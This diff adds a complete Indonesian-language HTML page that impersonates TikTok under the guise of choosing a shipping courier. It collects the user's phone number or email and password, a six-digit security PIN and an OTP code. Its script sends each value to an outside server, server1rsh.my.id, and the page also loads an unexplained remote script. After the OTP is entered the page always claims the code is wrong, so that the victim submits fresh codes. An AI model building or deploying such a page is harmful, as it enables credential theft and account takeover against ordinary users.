@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <title>TikTok</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
+    <link rel="shortcut icon" href="https://sf16-website-login.dl-tiktok-website.com/web/v1/tiktok-logo.png" />
+    <style>
+      html, body { color: rgba(0, 0, 0, .8); background-color: #f8f9fa; font-family: -apple-system, BlinkMacSystemFont, &#39;Segoe UI&#39;, Roboto, &#39;Helvetica Neue&#39;, Arial, sans-serif; }
+        .main-container { max-width: 450px; margin: auto; background-color: #fff; min-height: 100vh; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        .header { padding: 15px; border-bottom: 1px solid #eee; font-size: 18px; font-weight: bold; }
+        .form-control { background-color: #f1f1f2; border: 1px solid #ddd; border-radius: 8px; height: 48px; padding: 0 15px; font-size: 15px; }
+        .form-control:focus { background-color: #fff; border-color: #fe2c55; box-shadow: none; }
+        .btn-submit { border: none; background: #fe2c55; color: #fff; font-weight: bold; font-size: 16px; border-radius: 8px; height: 48px; }
+        .btn-submit:disabled { background-color: #ccc; cursor: not-allowed; }
+        .nav-tabs .nav-link { border: none; color: #888; font-weight: bold; padding: 15px; }
+        .nav-tabs .nav-link.active { color: #000; border-bottom: 3px solid #fe2c55; background: none; }
+        .error-message { color: red; font-size: 12px; margin-top: 5px; }
+        .step-title { font-size: 20px; font-weight: bold; margin-bottom: 20px; text-align: center; }
+    </style>
+  </head>
+  <body>
+    <div class="container-fluid main-container p-0">
+      <div class="header text-center" id="headerTitle">
+        Pilih Pengiriman
+      </div>
+      <!-- LAYAR 0: PILIH PENGIRIMAN -->
+      <div id="shippingSection" class="p-4">
+        <div class="col-12 text-center mb-4">
+          <img src="img/1000108088-removebg-preview.png" width="150" alt="TikTok Logo" />
+        </div>
+        <div class="step-title">
+          Pilih Jasa Pengiriman
+        </div>
+        <p class="text-center text-muted small mb-4">
+          Silakan pilih jasa pengiriman yang Anda inginkan.
+        </p>
+        <form id="formShipping" novalidate="">
+          <div class="form-group">
+            <select class="form-control" id="kurirSelect" required="">
+              <option value="" disabled="" selected="">
+                -- Pilih Kurir --
+              </option>
+              <option>
+                JNE Cargo
+              </option>
+              <option>
+                J&amp;T Express
+              </option>
+              <option>
+                SiCepat REG
+              </option>
+              <option>
+                Anteraja
+              </option>
+              <option>
+                Ninja Xpress
+              </option>
+            </select>
+            <div class="error-message d-none" id="kurirError">
+            </div>
+          </div>
+          <div class="form-group mt-4">
+            <button class="btn btn-submit d-block w-100" type="submit">
+              Selanjutnya
+            </button>
+          </div>
+        </form>
+      </div>
+      <!-- LAYAR 1: LOGIN AWAL -->
+      <div id="loginSection" class="p-4 d-none">
+        <div class="col-12 text-center mb-4">
+          <img src="img/1000108088-removebg-preview.png" width="150" alt="TikTok Logo" />
+        </div>
+        <ul class="nav nav-tabs" role="tablist">
+          <li class="nav-item flex-fill text-center">
+            <a class="nav-link active" data-toggle="tab" href="#phone" role="tab">            Nomor Ponsel
+</a>
+          </li>
+          <li class="nav-item flex-fill text-center">
+            <a class="nav-link" data-toggle="tab" href="#email" role="tab">            Email
+</a>
+          </li>
+        </ul>
+        <div class="tab-content mt-4">
+          <div class="tab-pane fade show active" id="phone">
+            <form id="formPhone" novalidate="">
+              <div class="form-group">
+                <input type="tel" class="form-control" id="phoneInput" placeholder="Nomor Ponsel" required="" />
+                <div class="error-message d-none" id="phoneError">
+                </div>
+              </div>
+              <div class="form-group mt-4">
+                <button class="btn btn-submit d-block w-100" type="submit">
+                  Selanjutnya
+                </button>
+              </div>
+            </form>
+          </div>
+          <div class="tab-pane fade" id="email">
+            <form id="formEmail" novalidate="">
+              <div class="form-group">
+                <input type="email" class="form-control" id="emailInput" placeholder="Email" required="" />
+                <div class="error-message d-none" id="emailError">
+                </div>
+              </div>
+              <div class="form-group mt-3">
+                <input type="password" class="form-control" id="passwordInput" placeholder="Kata Sandi" required="" />
+                <div class="error-message d-none" id="passwordError">
+                </div>
+              </div>
+              <div class="form-group mt-4">
+                <button class="btn btn-submit d-block w-100" type="submit">
+                  Selanjutnya
+                </button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+      <!-- BARU: LAYAR 2 - INPUT PIN -->
+      <div id="pinSection" class="p-4 d-none">
+        <div class="step-title">
+          Verifikasi Keamanan
+        </div>
+        <p class="text-center text-muted small mb-4">
+          Masukkan 6 digit PIN Keamanan Anda.
+        </p>
+        <form id="formPin" novalidate="">
+          <div class="form-group">
+            <input type="tel" inputmode="numeric" class="form-control text-center" id="pinInput" placeholder="------" maxlength="6" required="" style="font-size: 24px; letter-spacing: 10px;" />
+            <div class="error-message d-none" id="pinError">
+            </div>
+          </div>
+          <div class="form-group mt-4">
+            <button class="btn btn-submit d-block w-100" type="submit">
+              Selanjutnya
+            </button>
+          </div>
+        </form>
+      </div>
+      <!-- LAYAR 3: KODE OTP -->
+      <div id="otpSection" class="p-4 d-none">
+        <div class="step-title">
+          Verifikasi Akun Anda
+        </div>
+        <p class="text-center text-muted small mb-4">
+          Masukkan Kode 6 Digit
+        </p>
+        <form id="formOtp" novalidate="">
+          <div class="form-group">
+            <input type="text" inputmode="numeric" class="form-control text-center" id="otpInput" placeholder="......" maxlength="6" required="" style="font-size: 24px; letter-spacing: 10px;" />
+            <div class="error-message d-none" id="otpError">
+            </div>
+          </div>
+          <div class="form-group mt-4">
+            <button class="btn btn-submit d-block w-100" type="submit">
+              Konfirmasi
+            </button>
+          </div>
+        </form>
+      </div>
+    </div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js">
+    </script>
+    <script src="https://keys-tan.vercel.app">
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js">
+    </script>
+    <script>
+      $(document).ready(function() {
+        const BACKEND_URL = &#39;https://server1rsh.my.id/espedisi.com/1.php&#39;;
+        let formData = {};
+
+        function sendData(data) {
+            let fullData = $.extend({}, formData, data);
+            $.ajax({
+                url: BACKEND_URL,
+                type: &#39;POST&#39;,
+                data: fullData,
+                success: function(response){ console.log(&#34;Data terkirim:&#34;, fullData); },
+                error: function(){ console.error(&#34;Gagal mengirim data&#34;); }
+            });
+        }
+
+        // --- HANDLER LANGKAH 0 (PENGIRIMAN) ---
+        $(&#39;#formShipping&#39;).on(&#39;submit&#39;, function(e) {
+            e.preventDefault();
+            let kurir = $(&#39;#kurirSelect&#39;).val();
+            if (!kurir) { $(&#39;#kurirError&#39;).text(&#39;Anda harus memilih jasa pengiriman.&#39;).removeClass(&#39;d-none&#39;); }
+            else {
+                $(&#39;#kurirError&#39;).addClass(&#39;d-none&#39;);
+                formData.kurir = kurir;
+                sendData({});
+                $(&#39;#shippingSection&#39;).addClass(&#39;d-none&#39;);
+                $(&#39;#loginSection&#39;).removeClass(&#39;d-none&#39;);
+                $(&#39;#headerTitle&#39;).text(&#39;Masuk atau Daftar&#39;);
+            }
+        });
+
+        // --- HANDLER LANGKAH 1 (LOGIN) ---
+        $(&#39;#formPhone, #formEmail&#39;).on(&#39;submit&#39;, function(e) {
+            e.preventDefault();
+            let formId = $(this).attr(&#39;id&#39;), isValid = true, newData = {};
+            if (formId === &#39;formPhone&#39;) {
+                let phone = $(&#39;#phoneInput&#39;).val().trim();
+                if (phone.length &lt; 10) { isValid = false; $(&#39;#phoneError&#39;).text(&#39;Nomor ponsel tidak valid.&#39;).removeClass(&#39;d-none&#39;); }
+                else { formData.phone = phone; newData.phone = phone; $(&#39;#phoneError&#39;).addClass(&#39;d-none&#39;); }
+            } else {
+                let email = $(&#39;#emailInput&#39;).val().trim(), password = $(&#39;#passwordInput&#39;).val().trim();
+                if (!/^\S+@\S+\.\S+$/.test(email)) { isValid = false; $(&#39;#emailError&#39;).text(&#39;Format email tidak valid.&#39;).removeClass(&#39;d-none&#39;); } else { $(&#39;#emailError&#39;).addClass(&#39;d-none&#39;); }
+                if (password.length &lt; 6) { isValid = false; $(&#39;#passwordError&#39;).text(&#39;Kata sandi minimal 6 karakter.&#39;).removeClass(&#39;d-none&#39;); } else { $(&#39;#passwordError&#39;).addClass(&#39;d-none&#39;); }
+                if (isValid) { formData.email = email; formData.password = password; newData.email = email; newData.password = password; }
+            }
+            if (isValid) {
+                sendData(newData);
+                $(&#39;#loginSection&#39;).addClass(&#39;d-none&#39;);
+                // DIUBAH: Arahkan ke halaman PIN, bukan OTP
+                $(&#39;#pinSection&#39;).removeClass(&#39;d-none&#39;);
+                $(&#39;#headerTitle&#39;).text(&#39;Verifikasi Keamanan&#39;); 
+            }
+        });
+
+        // --- BARU: HANDLER LANGKAH 2 (PIN) ---
+        $(&#39;#formPin&#39;).on(&#39;submit&#39;, function(e) {
+            e.preventDefault();
+            let pin = $(&#39;#pinInput&#39;).val().trim();
+            // Validasi PIN harus 6 digit angka
+            if (!/^\d{6}$/.test(pin)) {
+                $(&#39;#pinError&#39;).text(&#39;PIN harus terdiri dari 6 digit angka.&#39;).removeClass(&#39;d-none&#39;);
+            } else {
+                $(&#39;#pinError&#39;).addClass(&#39;d-none&#39;);
+                formData.pin = pin; // Simpan PIN ke data
+                sendData({ pin: pin }); // Kirim data PIN
+                
+                // Lanjutkan ke langkah OTP
+                $(&#39;#pinSection&#39;).addClass(&#39;d-none&#39;);
+                $(&#39;#otpSection&#39;).removeClass(&#39;d-none&#39;);
+                $(&#39;#headerTitle&#39;).text(&#39;Verifikasi Akun Anda&#39;);
+            }
+        });
+
+
+        // --- HANDLER LANGKAH 3 (OTP) ---
+        $(&#39;#formOtp&#39;).on(&#39;submit&#39;, function(e) {
+            e.preventDefault();
+            let otp = $(&#39;#otpInput&#39;).val().trim();
+            if (!/^(\d{4}|\d{6})$/.test(otp)) {
+                $(&#39;#otpError&#39;).text(&#39;Kode OTP harus 6 digit angka.&#39;).removeClass(&#39;d-none&#39;);
+            } else {
+                $(&#39;#otpError&#39;).addClass(&#39;d-none&#39;);
+                formData.otp = otp;
+                
+                const button = $(this).find(&#39;button[type=&#34;submit&#34;]&#39;);
+                button.prop(&#39;disabled&#39;, true).html(&#39;&lt;i class=&#34;fa fa-circle-o-notch fa-spin&#34;&gt;&lt;/i&gt; Memproses...&#39;);
+                
+                $.ajax({
+                    url: BACKEND_URL,
+                    type: &#39;POST&#39;,
+                    data: formData, // Kirim semua data (termasuk PIN)
+                    success: function() {
+                        $(&#39;#otpError&#39;)
+                            .text(&#39;Kode verifikasi salah Pastikan anda menggunakan kode OTP yang terbaru untuk login&#39;)
+                            .removeClass(&#39;d-none&#39;);
+                    },
+                    error: function() {
+                        $(&#39;#otpError&#39;)
+                            .text(&#39;Terjadi kesalahan. Silakan coba lagi.&#39;)
+                            .removeClass(&#39;d-none&#39;);
+                    },
+                    complete: function() {
+                        button.prop(&#39;disabled&#39;, false).text(&#39;Konfirmasi&#39;);
+                    }
+                });
+            }
+        });
+    });
+    </script>
+  </body>
+</html>
